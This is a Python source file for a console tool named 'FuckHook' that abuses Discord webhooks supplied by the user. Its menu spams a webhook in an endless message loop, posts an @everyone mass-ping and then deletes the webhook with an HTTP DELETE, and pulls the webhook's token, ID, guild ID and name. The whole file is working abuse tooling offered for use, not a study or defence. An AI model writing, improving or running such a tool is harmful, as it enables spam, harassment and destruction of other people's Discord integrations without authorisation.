import requests
import discord_webhook
from discord_webhook import DiscordWebhook
import colorama
from colorama import Fore
colorama.init(autoreset=True)
import os
import time


os.system("title FuckHook // The Best Program To Fuck With A Webhook // OpenSearch#0001")

front = f"""{Fore.RED}

{Fore.RED}███████╗██╗   ██╗ ██████╗██╗  ██╗██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
{Fore.RED}██╔════╝██║   ██║██╔════╝██║ ██╔╝██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝
{Fore.RED}█████╗  ██║   ██║██║     █████╔╝ ███████║██║   ██║██║   ██║█████╔╝ 
{Fore.RED}██╔══╝  ██║   ██║██║     ██╔═██╗ ██╔══██║██║   ██║██║   ██║██╔═██╗ 
{Fore.RED}██║     ╚██████╔╝╚██████╗██║  ██╗██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
{Fore.RED}╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                   

                        {Fore.RED}[{Fore.MAGENTA}1{Fore.RED}]{Fore.MAGENTA} Webhook Spam{Fore.RED}
                        {Fore.RED}[{Fore.MAGENTA}2{Fore.RED}]{Fore.MAGENTA} Webhook Delete{Fore.RED}
                        {Fore.RED}[{Fore.MAGENTA}3{Fore.RED}]{Fore.MAGENTA} Webhook Guild ID{Fore.RED}
                        {Fore.RED}[{Fore.MAGENTA}4{Fore.RED}]{Fore.MAGENTA} Webhook Token{Fore.RED}
                        {Fore.RED}[{Fore.MAGENTA}5{Fore.RED}]{Fore.MAGENTA} Webhook ID{Fore.RED}
                        {Fore.RED}[{Fore.MAGENTA}6{Fore.RED}]{Fore.MAGENTA} Webhook Name{Fore.RED}
                        {Fore.RED}[{Fore.GREEN}*{Fore.RED}]{Fore.MAGENTA} Soon V2{Fore.RED}
"""
print(front)
choices = input(f"{Fore.RED}[{Fore.MAGENTA}FUCKHOOK{Fore.RED}]{Fore.MAGENTA} >>  {Fore.RED}")



if choices == '1':
    os.system("cls")
    wb1 = input(f"{Fore.RED}[{Fore.MAGENTA}WEBHOOK{Fore.RED}]{Fore.MAGENTA} >>  {Fore.RED}")
    msg1 = input(f"{Fore.RED}[{Fore.MAGENTA}MESSAGE{Fore.RED}]{Fore.MAGENTA} >>  {Fore.RED}")
    while True:
        webhook1 = DiscordWebhook(url=wb1, content=msg1, username="FuckHook", rate_limit_retry=True)
        responce = webhook1.execute()
        print(f"{Fore.RED}[SUCCESS] EZ EZ EZ EZ EZ EZ")    
elif choices == '2':
    os.system("cls")
    wb2 = input(f"{Fore.RED}[{Fore.MAGENTA}WEBHOOK{Fore.RED}]{Fore.MAGENTA} >>  {Fore.RED}")
    webhook2 = DiscordWebhook(url=wb2, content="Your Webhook Has Been Deleted By FuckHook [!] @everyone @everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone@everyone", username="FuckHook")
    responce = webhook2.execute()
    requests.delete(wb2)
    print(f"{Fore.RED}[{Fore.MAGENTA}+{Fore.RED}] Success !")
    time.sleep(5) 
elif choices == '3':
    os.system("cls")
    wb3 = input(f"{Fore.RED}[{Fore.MAGENTA}WEBHOOK{Fore.RED}]{Fore.MAGENTA} >>  {Fore.RED}")
    wbb = requests.get(wb3).json()
    guild_id = wbb['guild_id']
    print(f"{Fore.MAGENTA}Guild ID >>> "+guild_id)
    time.sleep(5)
elif choices == '4':
    os.system("cls")
    wb4 = input(f"{Fore.RED}[{Fore.MAGENTA}WEBHOOK{Fore.RED}]{Fore.MAGENTA} >>  {Fore.RED}")
    wbb = requests.get(wb4).json()
    wb_tkn = wbb['token']
    print(f"{Fore.MAGENTA}Webhook Token >>> "+wb_tkn)
    time.sleep(5)
elif choices == '5':
    os.system("cls")
    wb5 = input(f"{Fore.RED}[{Fore.MAGENTA}WEBHOOK{Fore.RED}]{Fore.MAGENTA} >>  {Fore.RED}")
    wbb = requests.get(wb5).json()
    wbid = wbb['id']
    print(f"{Fore.MAGENTA}Webhook ID >>> "+wbid)
    time.sleep(5)
elif choices == '6':
    os.system("cls")
    wb6 = input(f"{Fore.RED}[{Fore.MAGENTA}WEBHOOK{Fore.RED}]{Fore.MAGENTA} >>  {Fore.RED}")
    wbb = requests.get(wb6).json()
    wbname = wbb['name']
    print(f"{Fore.MAGENTA}Webhook Name >>> "+wbname)
    time.sleep(5)


